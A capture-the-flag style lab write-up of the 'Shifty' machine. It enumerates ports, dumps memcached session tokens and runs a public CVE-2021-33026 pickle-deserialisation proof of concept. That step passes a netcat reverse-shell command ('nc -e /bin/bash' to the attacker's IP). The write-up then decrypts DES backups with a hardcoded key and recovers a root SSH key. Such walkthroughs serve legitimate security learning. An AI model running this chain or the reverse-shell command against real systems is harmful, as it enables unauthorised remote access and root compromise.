# Shifty

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 192.168.202.59 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 21:57 +08
Nmap scan report for 192.168.202.59
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
5000/tcp  open   upnp
11211/tcp open   memcache
```

Memcache was open, of all things. I did a detailed `nmap` scan as well:

```
$ sudo nmap -p 80,5000,11211 -sC -sV --min-rate 4000 192.168.202.59           
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 21:58 +08
Nmap scan report for 192.168.202.59
Host is up (0.17s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      nginx 1.10.3
|_http-generator: Gatsby 2.22.15
|_http-server-header: nginx/1.10.3
|_http-title: Gatsby + Netlify CMS Starter
5000/tcp  open  http      Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Hello, world!
11211/tcp open  memcached Memcached 1.4.33 (uptime 150 seconds)
```

Interesting.&#x20;

### Web + Memcache Enum

Port 80 looked rather static:

<figure><img src="../../../.gitbook/assets/image (2223).png" alt=""><figcaption></figcaption></figure>

There was no public exploit for this software either, so let's move on. Port 5000 looked way more promising:

<figure><img src="../../../.gitbook/assets/image (2148).png" alt=""><figcaption></figcaption></figure>

We can login, and there's no additional functionality with this website. Viewing the requests, we can see that the login just assigned us a token:

<figure><img src="../../../.gitbook/assets/image (3658).png" alt=""><figcaption></figcaption></figure>

Moving to Memcache, we can dump it using `memcdump`. We instantly get loads of tokens:

```
$ memcdump --servers=192.168.202.59
<TRUNCATED>
session:8245fa94-7b27-4d99-a1c3-18a9f9db8e54
session:e90dd194-0be7-41f5-9362-a96431bea058
session:d5b40159-2bc4-4b57-91ae-2839ff3b040e
session:5cd631b0-49ba-4059-aae8-5dbae44f7c43
```

The last one was the same as above. I tried replacing the cookie within the request:

```http
GET /admin HTTP/1.1
Host: 192.168.202.59:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.202.59:5000/login
Connection: close
Cookie: session=hellothere
Upgrade-Insecure-Requests: 1

```

Interestingly, this cookie is stored in Memcached, indicating there's no cookie sanitisation there. Perhaps this could be poisoned?

<figure><img src="../../../.gitbook/assets/image (3353).png" alt=""><figcaption></figcaption></figure>

### Pickling RCE

I googled 'memcache cookie poisoning exploit' and looked at all the results. This repo was one of them:

{% embed url="https://github.com/CarlosG13/CVE-2021-33026" %}

It looked exactly like what I needed. So I tested it after resetting the VPN and the machine.&#x20;

```
$ python3 cve-2021-33026_PoC.py --rhost '192.168.202.59' --rport '5000' --cmd 'nc -e /bin/bash 192.168.45.179 80' --cookie 'session:session=5cd631b0-49ba-4059-aae8-5dbae44f7c43'
 ____ ___ ____ _  ___     _____         
|  _ \_ _/ ___| |/ / |   | ____|        
| |_) | | |   | ' /| |   |  _|    _____ 
|  __/| | |___| . \| |___| |___  |_____|
|_|  |___\____|_|\_\_____|_____|        
                                        
 __  __ _____ __  __  ____    _    ____ _   _ _____ ____   
|  \/  | ____|  \/  |/ ___|  / \  / ___| | | | ____|  _ \  
| |\/| |  _| | |\/| | |     / _ \| |   | |_| |  _| | | | | 
| |  | | |___| |  | | |___ / ___ \ |___|  _  | |___| |_| | 
|_|  |_|_____|_|  |_|\____/_/   \_\____|_| |_|_____|____/  
                                                           
  ____   ___ ___ ____   ___  _   _ ___ _   _  ____  
 |  _ \ / _ \_ _/ ___| / _ \| \ | |_ _| \ | |/ ___| 
 | |_) | | | | |\___ \| | | |  \| || ||  \| | |  _  
 |  __/| |_| | | ___) | |_| | |\  || || |\  | |_| | 
 |_|    \___/___|____/ \___/|_| \_|___|_| \_|\____|
```

We would get a shell on our listener port:

<figure><img src="../../../.gitbook/assets/image (2222).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Encrypted Files --> Root SSH

There was a `backup.py` file within `/opt/backups`:

```python
import sys
import os
import hashlib
from des import des, CBC, PAD_PKCS5

def backup(name, file):
    dest_dir = os.path.dirname(os.path.realpath(__file__)) + '/data'
    dest_name = hashlib.sha224(name.encode('utf-8')).hexdigest()
    with open('{}/{}'.format(dest_dir, dest_name), 'wb') as dest:
        data = file.read()
        k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
        cipertext = k.encrypt(data)
        dest.write(cipertext)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: {} <file>'.format(sys.argv[0]))
    
    FILENAME = sys.argv[1]
    FILENAME = os.path.abspath(FILENAME)
    print('Backing up "{}"'.format(FILENAME))
    f = None
    try:
        f = open(FILENAME, 'rb')
        backup(FILENAME, f)
    except Exception as e:
        print('Could not open {}'.format(FILENAME))
        print(e)
    finally:
        if f:
            f.close()
```

In the `data` directory, there's also loads of encrypted files:

```
jerry@shifty:/opt/backups/data$ ls
0317ce62a75684cf0fcf8452a7fe5e5e919d1b730644bf16a304a919
11e3e83c5ea13aaed3b3ceb5edd72b9431ebc6ec2c447d412a0b7c7c
1a171f6f6491d3e4ca9cc0ca15a6c508c8815f6e29004bb29c0724d5
1cb607653518c3b1f08b1341322ead36dd8f93c3d2bfa23916fe28bd
1fd8c1281b186594d3d49f38cded4ce40faf862e9d409eb2a3a201cf
25a74de564e2aa81fbb8682f3fef798deda63f4cca65fd58901caecb
31328fa57f5c504df041f7f4f45498c766c0d12c33f78f33cff66bca
3fa4dcd297e960dc9e875437c67e7817356c487f57f828453756a2cc
403c9401a0224bd4f483dedb33ed0bf37fbd93881783ea0e600a49ff
5b1c7de10787e87d4d868457b7bf828154f1d02f653f2b57bce17abc
65895ecf8b82b9fa742e8fabde0fd7e60f1258a9e7ba3c1e9367a3e0
7297aeb420d0530ccb52dcb7f905ecc8deffefc32d02691561a9172e
7824132f0f0cc6da1dce3763d50c38c2941d07f9648e34c6c9b9ccf8
8cd58cbefd50ef93f1a3b173456f9b6a09a7318ada378c3a49a980f2
9038291aaa6b222363fc78837b934d1e2f96bb7cfe11fd3d73149e72
92e8127d493e205bfbd8a9c0dd165da2154768cebafa1c752d9bf0dc
dd533e5634f95c6d86a4f37f01453f5326c80e58b8a01f0a4222c011
dfe0444a971a789bb405c54c270ae25460f5699319aad697c7fd35ee
f166b490169e7de5795a09305837198579daad4694e233d49b126d91
```

I made a copy of all these files within my home directory, and began decrypting it using `openssl`. From the python script and based on the documentation for `des`, the key would be `87629ae8` and the IV is all null bytes.&#x20;

Since the key is interpreted as a bytes type object, we need to convert it to hex, which would give `3837363239616538`.&#x20;

Then, we can decrypt the files:

{% code overflow="wrap" %}
```
jerry@shifty:~/backup$ openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in 3fa4dcd297e960dc9e875437c67e7817356c487f57f828453756a2cc -out decrypt
```
{% endcode %}

Then, we can bulk decrypt all of these files using a `bash` for loop:

{% code overflow="wrap" %}
```bash
for FILE in *; do openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in $FILE -out decrypt$FILE; rm $FILE; done
```
{% endcode %}

Then, we can read all of the files. Within the decrypted files, there was a SSH private key:

<figure><img src="../../../.gitbook/assets/image (2615).png" alt=""><figcaption></figcaption></figure>

Using this, we can `ssh` in as `root`:

<figure><img src="../../../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>

Rooted!
